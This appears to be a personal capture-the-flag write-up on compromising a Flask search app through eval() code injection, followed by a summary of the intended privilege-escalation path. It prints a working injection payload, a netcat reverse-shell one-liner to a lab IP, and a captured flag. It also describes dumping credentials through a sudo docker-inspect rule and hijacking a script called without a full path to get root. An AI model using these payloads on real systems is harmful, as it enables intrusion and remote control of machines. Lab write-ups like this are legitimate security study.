Another challenge I do not think I solved correctly, I am linking and talking through the proper solve further down.


# My (incorrect) Solve
Python Flask searchor vulnerability lead to a common PoC which could be bypassed with the simple code injection as seen below, as eval() was used
python `eval()` code injection;
`') + __import__('os').system('cat /home/svc/user.txt') #`

user flag:
654217ecdbd22be02e07a832d412296c


reverse shell:
`') + __import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.69 4444 >/tmp/f') #`



lots of ports:
root seemed too easy: just `bash -p` to escalate privileges...


# The Proper Solve

## Enumeration 
`.git/config` --> showed a subdomain (which I did not manage to find) along with credentials

````BASH
 sudo -S -l
````
^ shows a command which is allowed to be excuted as root:

The vuln = docker-inspect
- allows an instance's config to be dumped

This dumped the information of both a DB (rabbit hole) and a gitea user --> for the subdomain found earlier
- the latter pasword was used to log as administrator to gitea (git management dashboard)

The `system-checkup.py` script uses the `full-checkup.sh` script, but without a specified path, so a privileged shell can be established by creating and uploading a malicious shell as the `full-checkup.sh` script.

Run it with ````BASH
sudo -S /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
and a shell is spawned in a listener.

# Final Thoughts
The intended solve is obviously more interesting and neat, and I believe the easy solve wa also someone haivng left their root 'perseverance' solution available to all other users. BUT, a flag is a flag...
